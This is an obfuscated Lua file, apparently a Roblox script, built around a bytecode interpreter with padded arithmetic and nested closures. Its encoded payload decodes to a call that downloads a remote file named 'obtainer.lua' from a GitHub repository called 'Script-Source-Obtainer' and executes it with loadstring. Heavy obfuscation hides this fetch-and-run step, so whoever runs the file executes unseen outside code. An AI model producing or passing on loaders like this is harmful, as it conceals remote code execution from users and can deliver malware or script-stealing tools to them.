local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v82 = 0;
			local v83;
			while true do
				if (v82 ~= 0) then
				else
					v83 = v2(v0(v30, 16));
					if v19 then
						local v99 = 0;
						local v100;
						while true do
							if (v99 ~= 1) then
							else
								return v100;
							end
							if (v99 == 0) then
								v100 = v5(v83, v19);
								v19 = nil;
								v99 = 1;
							end
						end
					else
						return v83;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v84 = (v31 / (((1 + 4) - 3) ^ (v32 - 1))) % ((5 - 3) ^ (((v33 - 1) - (v32 - (1 - (877 - (282 + 595))))) + (2 - 1)));
			return v84 - (v84 % ((2257 - (1523 + 114)) - (499 + 56 + 64)));
		else
			local v85 = (933 - (857 + 74)) ^ (v32 - (569 - (367 + 201)));
			return (((v31 % (v85 + v85)) >= v85) and (928 - (214 + 713))) or (0 + 0);
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + (2 - 0));
		v18 = v18 + 2;
		return (v36 * (1321 - (68 + 997))) + v35;
	end
	local function v23()
		local v37 = 1270 - (226 + 1044);
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if (v37 == (4 - 3)) then
				return (v41 * (16777333 - (32 + 85))) + (v40 * 65536) + (v39 * (251 + (11 - 6))) + v38;
			end
			if (v37 ~= (0 + (0 - 0))) then
			else
				v38, v39, v40, v41 = v1(v16, v18, v18 + (960 - (892 + 65)));
				v18 = v18 + 4;
				v37 = 1 - 0;
			end
		end
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 351 - (87 + 263);
		local v45 = (v20(v43, 181 - (67 + 113), 15 + 5) * ((4 - 2) ^ (5 + 19 + 8))) + v42;
		local v46 = v20(v43, 83 - 62, (1746 - 763) - (802 + 150));
		local v47 = ((v20(v43, 85 - 53) == ((1 + 0) - 0)) and -1) or (1 + 0);
		if (v46 == 0) then
			if (v45 == (997 - (915 + (873 - (368 + 423))))) then
				return v47 * (0 - 0);
			else
				v46 = 1;
				v44 = 0;
			end
		elseif (v46 == (1193 + 854)) then
			return ((v45 == (0 - (0 - 0))) and (v47 * ((1188 - (1069 + 118)) / (0 - 0)))) or (v47 * NaN);
		end
		return v8(v47, v46 - (2237 - 1214)) * (v44 + (v45 / (2 ^ 52)));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			local v86 = 18 - (10 + 8);
			while true do
				if (v86 ~= ((880 - (145 + 293)) - ((846 - (44 + 386)) + 26))) then
				else
					v48 = v23();
					if (v48 ~= ((1486 - (998 + 488)) - 0)) then
					else
						return "";
					end
					break;
				end
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - (1 + 0));
		v18 = v18 + v48;
		local v50 = {};
		for v65 = 1 - 0, #v49 do
			v50[v65] = v2(v1(v3(v49, v65, v65)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return 0;
		end)();
		local v52 = (function()
			return;
		end)();
		local v53 = (function()
			return;
		end)();
		local v54 = (function()
			return;
		end)();
		local v55 = (function()
			return;
		end)();
		local v56 = (function()
			return;
		end)();
		local v57 = (function()
			return;
		end)();
		local v58 = (function()
			return;
		end)();
		while true do
			local v67 = (function()
				return 675 - (534 + 141);
			end)();
			while true do
				if (v67 ~= 0) then
				else
					local v89 = (function()
						return 0 + 0;
					end)();
					while true do
						if (v89 ~= 1) then
						else
							v67 = (function()
								return 1;
							end)();
							break;
						end
						if (v89 == 0) then
							if (v51 ~= (0 + 0)) then
							else
								local v101 = (function()
									return 0 + 0;
								end)();
								while true do
									if (v101 ~= (0 - 0)) then
									else
										v52 = (function()
											return function(v149, v150, v151)
												local v152 = (function()
													return 0;
												end)();
												local v153 = (function()
													return;
												end)();
												while true do
													if (v152 ~= (0 - 0)) then
													else
														v153 = (function()
															return 0 - 0;
														end)();
														while true do
															if (0 == v153) then
																v149[v150 - #">"] = (function()
																	return v151();
																end)();
																return v149, v150, v151;
															end
														end
														break;
													end
												end
											end;
										end)();
										v53 = (function()
											return {};
										end)();
										v101 = (function()
											return 1 + 0;
										end)();
									end
									if (v101 == 1) then
										v54 = (function()
											return {};
										end)();
										v51 = (function()
											return 1 + 0;
										end)();
										break;
									end
								end
							end
							if (v51 ~= 3) then
							else
								for v102 = #">", v23() do
									local v103 = (function()
										return 0;
									end)();
									local v104 = (function()
										return;
									end)();
									while true do
										if (0 ~= v103) then
										else
											v104 = (function()
												return v21();
											end)();
											if (v20(v104, #":", #"[") ~= (396 - (115 + 281))) then
											else
												local v160 = (function()
													return 0;
												end)();
												local v161 = (function()
													return;
												end)();
												local v162 = (function()
													return;
												end)();
												local v163 = (function()
													return;
												end)();
												while true do
													if (v160 ~= 3) then
													else
														if (v20(v162, #"91(", #"xxx") ~= #"|") then
														else
															v163[#"xnxx"] = (function()
																return v58[v163[#"asd1"]];
															end)();
														end
														v53[v102] = (function()
															return v163;
														end)();
														break;
													end
													if (v160 ~= (0 - 0)) then
													else
														v161 = (function()
															return v20(v104, 2, #"-19");
														end)();
														v162 = (function()
															return v20(v104, #"xnxx", 6);
														end)();
														v160 = (function()
															return 1 + 0;
														end)();
													end
													if (v160 == (2 - 1)) then
														local v168 = (function()
															return 0;
														end)();
														local v169 = (function()
															return;
														end)();
														while true do
															if ((0 - 0) ~= v168) then
															else
																v169 = (function()
																	return 0;
																end)();
																while true do
																	if (v169 ~= 0) then
																	else
																		local v175 = (function()
																			return 867 - (550 + 317);
																		end)();
																		while true do
																			if (v175 == 1) then
																				v169 = (function()
																					return 1 - 0;
																				end)();
																				break;
																			end
																			if (0 ~= v175) then
																			else
																				v163 = (function()
																					return {v22(),v22(),nil,nil};
																				end)();
																				if (v161 == 0) then
																					local v176 = (function()
																						return 0;
																					end)();
																					local v177 = (function()
																						return;
																					end)();
																					while true do
																						if (v176 ~= (0 - 0)) then
																						else
																							v177 = (function()
																								return 0 - 0;
																							end)();
																							while true do
																								if (v177 ~= 0) then
																								else
																									v163[#"91("] = (function()
																										return v22();
																									end)();
																									v163[#"xnxx"] = (function()
																										return v22();
																									end)();
																									break;
																								end
																							end
																							break;
																						end
																					end
																				elseif (v161 == #"~") then
																					v163[#"-19"] = (function()
																						return v23();
																					end)();
																				elseif (v161 == (287 - (134 + 151))) then
																					v163[#"19("] = (function()
																						return v23() - (2 ^ 16);
																					end)();
																				elseif (v161 ~= #"91(") then
																				else
																					local v182 = (function()
																						return 1665 - (970 + 695);
																					end)();
																					local v183 = (function()
																						return;
																					end)();
																					while true do
																						if (v182 ~= (0 - 0)) then
																						else
																							v183 = (function()
																								return 0;
																							end)();
																							while true do
																								if (v183 ~= 0) then
																								else
																									v163[#"asd"] = (function()
																										return v23() - (2 ^ 16);
																									end)();
																									v163[#"0836"] = (function()
																										return v22();
																									end)();
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																				v175 = (function()
																					return 1991 - (582 + 1408);
																				end)();
																			end
																		end
																	end
																	if (v169 ~= (3 - 2)) then
																	else
																		v160 = (function()
																			return 2 - 0;
																		end)();
																		break;
																	end
																end
																break;
															end
														end
													end
													if (v160 ~= (7 - 5)) then
													else
														if (v20(v162, #"~", #",") ~= #"|") then
														else
															v163[2] = (function()
																return v58[v163[1826 - (1195 + 629)]];
															end)();
														end
														if (v20(v162, 2, 2) ~= #"[") then
														else
															v163[#"gha"] = (function()
																return v58[v163[#"91("]];
															end)();
														end
														v160 = (function()
															return 3;
														end)();
													end
												end
											end
											break;
										end
									end
								end
								for v105 = #"!", v23() do
									v54, v105, v28 = (function()
										return v52(v54, v105, v28);
									end)();
								end
								return v56;
							end
							v89 = (function()
								return 1 - 0;
							end)();
						end
					end
				end
				if ((242 - (187 + 54)) ~= v67) then
				else
					if (v51 == 1) then
						local v96 = (function()
							return 0;
						end)();
						while true do
							if (v96 ~= (781 - (162 + 618))) then
							else
								v57 = (function()
									return v23();
								end)();
								v51 = (function()
									return 2;
								end)();
								break;
							end
							if (v96 ~= (0 + 0)) then
							else
								v55 = (function()
									return {};
								end)();
								v56 = (function()
									return {v53,v54,nil,v55};
								end)();
								v96 = (function()
									return 1;
								end)();
							end
						end
					end
					if (v51 ~= 2) then
					else
						local v97 = (function()
							return 0 - 0;
						end)();
						local v98 = (function()
							return;
						end)();
						while true do
							if ((0 - 0) == v97) then
								v98 = (function()
									return 0 + 0;
								end)();
								while true do
									if (v98 ~= (1637 - (1373 + 263))) then
									else
										v56[#"asd"] = (function()
											return v21();
										end)();
										v51 = (function()
											return 3;
										end)();
										break;
									end
									if (v98 ~= (1000 - (451 + 549))) then
									else
										v58 = (function()
											return {};
										end)();
										for v140 = #"!", v57 do
											local v141 = (function()
												return 0;
											end)();
											local v142 = (function()
												return;
											end)();
											local v143 = (function()
												return;
											end)();
											local v144 = (function()
												return;
											end)();
											while true do
												if (v141 ~= (0 + 0)) then
												else
													v142 = (function()
														return 0 - 0;
													end)();
													v143 = (function()
														return nil;
													end)();
													v141 = (function()
														return 1;
													end)();
												end
												if (v141 ~= 1) then
												else
													v144 = (function()
														return nil;
													end)();
													while true do
														if (v142 ~= 0) then
														else
															v143 = (function()
																return v21();
															end)();
															v144 = (function()
																return nil;
															end)();
															v142 = (function()
																return 1;
															end)();
														end
														if ((1 - 0) ~= v142) then
														else
															if (v143 == #" ") then
																v144 = (function()
																	return v21() ~= 0;
																end)();
															elseif (v143 == (1386 - (746 + 638))) then
																v144 = (function()
																	return v24();
																end)();
															elseif (v143 ~= #"asd") then
															else
																v144 = (function()
																	return v25();
																end)();
															end
															v58[v140] = (function()
																return v144;
															end)();
															break;
														end
													end
													break;
												end
											end
										end
										v98 = (function()
											return 1 + 0;
										end)();
									end
								end
								break;
							end
						end
					end
					break;
				end
			end
		end
	end
	local function v29(v59, v60, v61)
		local v62 = v59[1 - 0];
		local v63 = v59[2];
		local v64 = v59[344 - (218 + 123)];
		return function(...)
			local v68 = v62;
			local v69 = v63;
			local v70 = v64;
			local v71 = v27;
			local v72 = 1582 - (1535 + 46);
			local v73 = -1;
			local v74 = {};
			local v75 = {...};
			local v76 = v12("#", ...) - (1 + 0);
			local v77 = {};
			local v78 = {};
			for v87 = 560 - ((1518 - (323 + 889)) + 254), v76 do
				if ((v87 >= v70) or (3200 <= 3134)) then
					v74[v87 - v70] = v75[v87 + 1 + 0];
				else
					v78[v87] = v75[v87 + (1 - (0 - 0))];
				end
			end
			local v79 = (v76 - v70) + (1468 - (899 + 568));
			local v80;
			local v81;
			while true do
				local v88 = 0 + 0;
				while true do
					if (v88 ~= (0 - 0)) then
					else
						v80 = v68[v72];
						v81 = v80[604 - (268 + (915 - (361 + 219)))];
						v88 = 1;
					end
					if (v88 ~= ((611 - (53 + 267)) - (60 + 230))) then
					else
						if (v81 <= 3) then
							if (v81 <= (573 - (426 + 146))) then
								if (v81 == (0 + 0)) then
									v78[v80[(330 + 1128) - (282 + 1174)]] = {};
								else
									local v107 = 811 - (569 + 242);
									local v108;
									local v109;
									local v110;
									local v111;
									while true do
										if ((v107 == (2 - 1)) or (3275 == 1804)) then
											v73 = (v110 + v108) - (1 + 0);
											v111 = 1024 - (706 + 318);
											v107 = 1253 - (721 + 530);
										end
										if (((1271 - (945 + 326)) == v107) or (1417 > 3629)) then
											v108 = v80[4 - 2];
											v109, v110 = v71(v78[v108](v13(v78, v108 + 1 + 0, v80[703 - (271 + 429)])));
											v107 = 1 + (413 - (15 + 398));
										end
										if (v107 ~= (1502 - (1408 + 92))) then
										else
											for v164 = v108, v73 do
												v111 = v111 + ((2069 - (18 + 964)) - (461 + (2352 - 1727)));
												v78[v164] = v109[v111];
											end
											break;
										end
									end
								end
							elseif (v81 > 2) then
								local v112;
								local v113, v114;
								local v115;
								local v116;
								v78[v80[1290 - (993 + 295)]] = {};
								v72 = v72 + 1;
								v80 = v68[v72];
								v78[v80[2]] = v61[v80[1 + 2 + 0]];
								v72 = v72 + 1;
								v80 = v68[v72];
								v78[v80[1173 - (418 + 753)]] = v61[v80[2 + 1]];
								v72 = v72 + 1 + 0;
								v80 = v68[v72];
								v116 = v80[1 + 1];
								v115 = v78[v80[1 + 2]];
								v78[v116 + 1] = v115;
								v78[v116] = v115[v80[533 - (406 + 123)]];
								v72 = v72 + 1;
								v80 = v68[v72];
								v78[v80[1771 - (1749 + 20)]] = v80[1 + 2];
								v72 = v72 + ((834 + 489) - (1249 + 73));
								v80 = v68[v72];
								v116 = v80[1 + 1];
								v113, v114 = v71(v78[v116](v13(v78, v116 + (1146 - (466 + 679)), v80[6 - (853 - (20 + 830))])));
								v73 = (v114 + v116) - (2 - 1);
								v112 = 1900 - (106 + 1794);
								for v137 = v116, v73 do
									v112 = v112 + 1 + 0;
									v78[v137] = v113[v112];
								end
								v72 = v72 + 1 + 0;
								v80 = v68[v72];
								v116 = v80[(4 + 1) - 3];
								v78[v116] = v78[v116](v13(v78, v116 + (2 - 1), v73));
								v72 = v72 + 1;
								v80 = v68[v72];
								v78[v80[116 - (4 + (236 - (116 + 10)))]]();
								v72 = v72 + 1;
								v80 = v68[v72];
								do
									return;
								end
							else
								do
									return;
								end
							end
						elseif (v81 <= 5) then
							if (v81 == (588 - (5 + 52 + (1265 - (542 + 196))))) then
								v78[v80[1429 - (41 + 1386)]]();
							else
								v78[v80[105 - (17 + 86)]] = v61[v80[(6 - 3) + 0 + 0]];
							end
						elseif (v81 <= (13 - 7)) then
							local v133 = 0;
							local v134;
							local v135;
							while true do
								if ((4795 > 402) and (v133 == 0)) then
									v134 = v80[5 - 3];
									v135 = v78[v80[169 - (122 + 44)]];
									v133 = 1 - 0;
								end
								if (v133 == (3 - 2)) then
									v78[v134 + 1 + 0] = v135;
									v78[v134] = v135[v80[1 + 3]];
									break;
								end
							end
						elseif (v81 == 7) then
							v78[v80[3 - 1]] = v80[68 - (30 + 35)];
						else
							local v147 = v80[2 + 0];
							v78[v147] = v78[v147](v13(v78, v147 + (1258 - (1043 + 214)), v73));
						end
						v72 = v72 + 1;
						break;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035F3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4E612Q786F5265616C2F5363726970742D536F757263652D4F627461696E65722F726566732F68656164732F6D61696E2F6F627461696E65722E6C756100094Q00037Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00", v9(), ...);
